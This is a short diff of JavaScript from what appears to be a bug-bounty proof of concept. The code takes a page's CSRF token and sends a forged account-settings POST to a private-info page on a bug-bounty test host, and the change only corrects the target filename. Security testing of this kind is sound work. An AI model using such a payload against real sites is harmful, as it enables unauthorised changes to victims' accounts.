@@ -23,7 +23,7 @@ if (csrfTokenElement) {
     formData.append('myaccount', 'Save changes');
             
     // 发送 POST 请求（不处理返回数据）
-    fetch('https://bugbounty-secure.dctest.donorschoose.org/common/11111private-info.html', {
+    fetch('https://bugbounty-secure.dctest.donorschoose.org/common/private-info.html', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
